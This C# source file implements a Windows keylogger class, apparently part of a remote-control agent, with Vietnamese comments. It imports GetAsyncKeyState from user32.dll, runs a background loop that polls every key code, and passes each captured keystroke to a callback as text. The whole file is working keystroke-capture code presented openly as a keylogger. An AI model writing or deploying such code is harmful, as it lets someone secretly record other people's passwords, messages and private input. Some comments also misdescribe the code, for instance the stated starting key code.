using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RCS.Agent.Services.Windows
{
    public class Keylogger
    {
        private CancellationTokenSource _cts;
        private Action<string> _onKeyPressed;

        // Import hàm API của Windows để kiểm tra trạng thái phím
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        public void Start(Action<string> onKeyPressed)
        {
            if (_cts != null) return;
            _cts = new CancellationTokenSource();
            _onKeyPressed = onKeyPressed;

            // Chạy luồng quét phím thật
            Task.Run(async () => await RealKeylogLoop(_cts.Token));
        }

        public void Stop()
        {
            _cts?.Cancel();
            _cts = null;
        }

        private async Task RealKeylogLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                // Quét qua các mã phím ASCII từ 8 (Backspace) đến 255
                for (int i = 0; i < 255; i++)
                {
                    // Kiểm tra nếu phím đang được nhấn (Bit cao nhất là 1)
                    int state = GetAsyncKeyState(i);
                    if ((state & 0x8000) != 0)
                    {
                        // Xử lý phím để hiển thị đẹp hơn
                        string key = ((System.Windows.Forms.Keys)i).ToString();
                        
                        // Lọc bỏ một số phím chuột để đỡ rác log
                        if (key.Contains("Button")) continue;

                        // Format lại text
                        if (key.Length == 1) 
                            _onKeyPressed?.Invoke(key); // Chữ cái thường
                        else 
                            _onKeyPressed?.Invoke($" [{key}] "); // Phím chức năng (Enter, Space...)

                        // Delay nhỏ để tránh bị double phím do CPU quét quá nhanh
                        await Task.Delay(100); 
                    }
                }
                await Task.Delay(5); // Nghỉ nhẹ để không ngốn CPU
            }
        }
    }
}